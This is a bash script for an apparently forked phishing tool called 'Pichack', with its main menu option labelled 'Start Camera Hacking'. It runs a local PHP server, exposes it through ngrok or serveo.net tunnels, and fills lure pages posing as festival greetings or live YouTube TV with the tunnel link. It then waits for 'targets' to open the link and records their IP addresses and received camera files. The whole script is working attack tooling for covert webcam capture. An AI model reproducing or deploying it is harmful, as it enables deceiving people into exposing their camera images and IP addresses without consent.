#!/bin/bash
# Pichck v1.0
# Powered by The Jatin Kalwar
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

banner() {
clear

echo '
                             __
                         __ /_/\___
                        /__/[]\/__/|o-_
                        |    _     ||   -_  
                        |  ((_))   ||     -_
                        |__________|/' | lolcat
echo                
printf "\e[1;92m  _______ _________ _______  \e[0m\e[1;93m          _______  _______  _        \e[0m\n"
printf "\e[1;92m (  ____ )\__   __/(  ____ \ \e[0m\e[1;93m|\     /|(  ___  )(  ____ \| \    /\ \e[0m\n"
printf "\e[1;92m | (    )|   ) (   | (    \/ \e[0m\e[1;93m| )   ( || (   ) || (    \/|  \  / / \e[0m\n"
printf "\e[1;92m | (____)|   | |   | |       \e[0m\e[1;93m| (___) || (___) || |      |  (_/ /  \e[0m\n"
printf "\e[1;92m |  _____)   | |   | |       \e[0m\e[1;93m|  ___  ||  ___  || |      |   _ (   \e[0m\n"
printf "\e[1;92m | (         | |   | |       \e[0m\e[1;93m| (   ) || (   ) || |      |  ( \ \  \e[0m\n"
printf "\e[1;92m | )      ___) (___| (____/\ \e[0m\e[1;93m| )   ( || )   ( || (____/\|  /  \ \ \e[0m\n"
printf "\e[1;92m |/       \_______/(_______/ \e[0m\e[1;93m|/     \||/     \|(_______/|_/    \/ \e[0m\n\n"
  
  echo -e "\e[77mCoded By The Jatin Kalwar \e[92m(Jatt)"                          





}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}
## About
about() {
echo -e '\e[91m
                    ──▐─▌──▐─▌──
                    ─▐▌─▐▌▐▌─▐▌─
                    ─█▄▀▄██▄▀▄█─
                    ──▄──██▌─▄──
                    ▄▀─█▀██▀█─▀▄
                    ▐▌▐▌─▐▌─▐▌▐▌
                    ─▐─█────█─▌─
                    ────▌──▐────
'
echo -e "\e[93m                    CALL ME \e[92mJATT" | pv -qL 10
echo -e "\e[93m               REAL NAME \e[92mJATIN KALWAR" | pv -qL 10
echo -e "\e[93m             IAM FROM \e[92mYOURHACKINGHOUSE" | pv -qL 10
echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "\e[93m         OOPS... I TALK  A LOT SRY FOR THAT " | pv -qL 10
echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
echo -e "\e[93m        MY WEBSITE:\e[92m https://bit.ly/2QT6dSR \e[0m" | pv -qL 10

echo -e "\e[92m                BYEE.............." | pv -qL 10
sleep 8.0
bash pichack.sh
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 2 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}
##Update
  upd(){
if [ -d "$HOME/fisher" ];
then
cd $HOME
rm -rf fisher
elif [ -d "$HOME/fisher" ];
then
cd $HOME
rm -rf fisher
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/jatinkalwar/Pichack 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd Pichack
bash pichack.sh
}
## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

###patch
upda() {
 
if [ -d "$HOME/Pichack/off" ];
then
cd $HOME/Pichack/off
rm pic.txt
elif [ -d "$HOME/Pichack/off" ];
then
cd $HOME/Pichack
rm pic.txt
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATING NGROK, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m      NGROK UPDATED SUCCESSFULLY (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd toolupdater/error
mv pic.txt $HOME/Pichack/off
cd $HOME
rm -rf toolupdater

}
## Menu
main_menu() {
	{ clear; banner; echo; }
     echo -e "\e[92m[\e[91m1\e[92m]\e[93m Start Camera Hacking\e[93m"
     echo -e "\e[92m[\e[91m2\e[92m]\e[93m Access Key\e[93m"
     echo -e "\e[92m[\e[91m3\e[92m]\e[93m About Me\e[93m"
     echo -e "\e[92m[\e[91m4\e[92m]\e[93m Practicle Video\e[93m"
     echo -e "\e[92m[\e[91m5\e[92m]\e[93m Visit Our Website\e[93m"
     echo -e "\e[92m[\e[91m6\e[92m]\e[93m Follow Us On Instagram\e[93m"
     echo -e "\e[92m[\e[91m7\e[92m]\e[93m Subscribe Our Channel\e[93m"
     echo -e "\e[92m[\e[91m8\e[92m]\e[93m Join Our Whatsapp Group\e[93m"
     echo -e "\e[92m[\e[91m9\e[92m]\e[93m Update Tool\e[93m"
     echo -e "\e[92m[\e[91m0\e[92m]\e[93m Exit\e[93m"

echo ''
echo -ne "SELECT OPTION ~> \e[0m"
read opt1
if [ $opt1 = "1" ];
then
clear
banner
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read  -p "ACCESS KEY: " access
cd $HOME/Pichack/off
bas=$(cat pic.txt)
if [[ $access = $bas ]];
then
clear
  banner
  camphish
        
else
clear
echo " "
echo -e "               \e[34m ============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
echo -e "               \e[34m |                          |"
echo -e "               \e[34m |    Use shortlink for key |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/JfDYEEfD\e[34m |"
echo -e "               \e[34m |            [OR]          |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m|"
echo -e "               \e[34m ============================\e[34m"
echo " "
sleep 5.0
fi
main_menu


elif [ $opt1 = "2" ];
then
am start -a android.intent.action.VIEW -d https://gplinks.co/JfDYEEfD > /dev/null
main_menu

elif [ $opt1 = "3" ];
then
clear
about
elif [ $opt1 = "4" ];
then
am start -a android.intent.action.VIEW -d https://bit.ly/3tPXkI3 > /dev/null
main_menu
elif [ $opt1 = "5" ];
then
am start -a android.intent.action.VIEW -d https://bit.ly/3tPXkI3 > /dev/null
main_menu
elif [ $opt1 = "6" ];
then
am start -a android.intent.action.VIEW -d https://www.instagram.com/yourhackinghouse/ > /dev/null 2>&1
main_menu
elif [ $opt1 = "7" ];
then
am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCMwPUQZrcSMzaW4yzhsXCXw > /dev/null 2>&1
main_menu
elif [ $opt1 = "8" ];
then
am start -a android.intent.action.VIEW -d https://forms.gle/qcLLqJZ2U94sFzrF6 > /dev/null
main_menu
elif [ $opt1 = "9" ];
then
clear
upd
elif [ $opt1 = "0" ];
then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi
}

banner
dependencies
clear
banner
upda
clear
main_menu

